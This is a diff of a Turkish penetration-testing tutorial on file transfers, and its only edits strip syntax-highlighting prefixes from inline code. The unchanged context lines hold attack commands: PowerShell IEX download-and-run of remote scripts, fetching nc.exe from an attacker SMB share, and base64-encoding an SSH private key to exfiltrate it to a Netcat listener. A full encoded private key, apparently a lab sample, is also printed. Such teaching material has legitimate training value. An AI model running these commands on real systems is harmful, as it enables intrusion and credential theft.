@@ -90,7 +90,7 @@ IEX aynı zamanda aşağıdaki şekilde pipeline girdisi ile de kullanılabilir:
 
 ### PowerShell Invoke-WebRequest
 
-PowerShell 3.0 ve sonrasında `#!powershell Invoke-WebRequest` Cmdlet kullanılabilir. Alias olarak `#!powershell iwr`, `#!powershell curl` ve `#!powershell wget` kullanılabilir:
+PowerShell 3.0 ve sonrasında `Invoke-WebRequest` Cmdlet kullanılabilir. Alias olarak `iwr`, `curl` ve `wget` kullanılabilir:
 
 ```powershell
 Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
@@ -134,7 +134,7 @@ Linux makinemizde SMB sunucusu kurmak için Impacket [smbserver.py](https://gith
 sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
 
-Daha sonra Windows makinesinde `#!batch copy` komutu ile bu sunucudan dosya indirebiliriz:
+Daha sonra Windows makinesinde `copy` komutu ile bu sunucudan dosya indirebiliriz:
 
 ```batch
 copy \\192.168.220.133\share\nc.exe
@@ -206,13 +206,13 @@ PowerShell kullanarak bir Base64 dizesinin kodunun nasıl çözüleceğini görd
 
 !!! info "AsByteStream"
 
-    `#!powershell Get-Content` kullanımında `parameter cannot be found` hatası alırsan `-AsByteStream` yerine `-Raw -Encoding Byte` kullanmayı deneyebilirsin.
+    `Get-Content` kullanımında `parameter cannot be found` hatası alırsan `-AsByteStream` yerine `-Raw -Encoding Byte` kullanmayı deneyebilirsin.
 
 ```text title="Output"
 LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
 ```
 
-Çıktıda elde edilen bu string, Linux makinesinde `#!bash base64` aracı kullanılarak kodu çözüldükten sonra dosya olarak kaydedilebilir:
+Çıktıda elde edilen bu string, Linux makinesinde `base64` aracı kullanılarak kodu çözüldükten sonra dosya olarak kaydedilebilir:
 
 ```bash
 echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo= | base64 -d > id_rsa
@@ -244,7 +244,7 @@ md5sum id_rsa
 
 ### PowerShell Web Uploads
 
-PowerShell yükleme işlemleri için yerleşik işlevler içermez. Ancak yükleme işlevimizi oluşturmak için `#!powershell Invoke-WebRequest` veya `#!powershell Invoke-RestMethod` komutları kullanılabilir. Ayrıca yüklemeleri kabul eden bir web sunucusuna da ihtiyacımız olacak. Bu, çoğu yaygın web sunucusu programında varsayılan seçenek değildir.
+PowerShell yükleme işlemleri için yerleşik işlevler içermez. Ancak yükleme işlevimizi oluşturmak için `Invoke-WebRequest` veya `Invoke-RestMethod` komutları kullanılabilir. Ayrıca yüklemeleri kabul eden bir web sunucusuna da ihtiyacımız olacak. Bu, çoğu yaygın web sunucusu programında varsayılan seçenek değildir.
 
 Web sunucumuz için Python [http.server](https://docs.python.org/3/library/http.server.html) modülünün dosya yüklemeleri için genişletilmiş bir versiyonu olan [uploadserver](https://github.com/Densaugeo/uploadserver) modülünü kullanabiliriz:
 
@@ -258,7 +258,7 @@ Yükleme işlemlerini gerçekleştirmek için [PSUpload.ps1](https://github.com/
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
 ```
 
-Bu script `#!powershell Invoke-RestMethod` fonksiyonunu içerir ve bu fonksiyon `File` ve `Uri` olmak üzere iki adet değere ihtiyaç duyar.
+Bu script `Invoke-RestMethod` fonksiyonunu içerir ve bu fonksiyon `File` ve `Uri` olmak üzere iki adet değere ihtiyaç duyar.
 
 Gerekli değerleri fonksiyona sağlayarak ilgili dosyayı Python ile oluşturduğumuz sunucuya yükleyebiliriz:
 
@@ -268,7 +268,7 @@ Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File "C:\Users\Public\
 
 ### PowerShell Base64 Web Upload
 
-Yükleme işlemleri için PowerShell ve Base64 kodlu dosyaları kullanmanın bir başka yolu da Netcat ile `#!powershell Invoke-WebRequest` veya `#!powershell Invoke-RestMethod` kullanmaktır.
+Yükleme işlemleri için PowerShell ve Base64 kodlu dosyaları kullanmanın bir başka yolu da Netcat ile `Invoke-WebRequest` veya `Invoke-RestMethod` kullanmaktır.
 
 İlk olarak Netcat ile belirli bir portu dinlemeye başlarız:
 
@@ -284,7 +284,7 @@ $b64 = [Convert]::ToBase64String((Get-Content -Path "C:\Windows\Public\id_rsa" -
 
 !!! info "AsByteStream"
 
-    `#!powershell Get-Content` kullanımında `parameter cannot be found` hatası alırsan `-AsByteStream` yerine `-Raw -Encoding Byte` kullanmayı deneyebilirsin.
+    `Get-Content` kullanımında `parameter cannot be found` hatası alırsan `-AsByteStream` yerine `-Raw -Encoding Byte` kullanmayı deneyebilirsin.
 
 Bu değişkenin değerini POST isteği ile daha önceden belirttiğimiz porta gönderelim:
 
@@ -316,7 +316,7 @@ WebDAV sunucumuzu kurmak için `wsgidav` ve `cheroot` isimli iki adet Python mod
 sudo pip install wsgidav cheroot
 ```
 
-Modüller kurulduktan sonra hedef dizinde `#!bash wsgidav` uygulamasını çalıştırıyoruz:
+Modüller kurulduktan sonra hedef dizinde `wsgidav` uygulamasını çalıştırıyoruz:
 
 ```bash
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
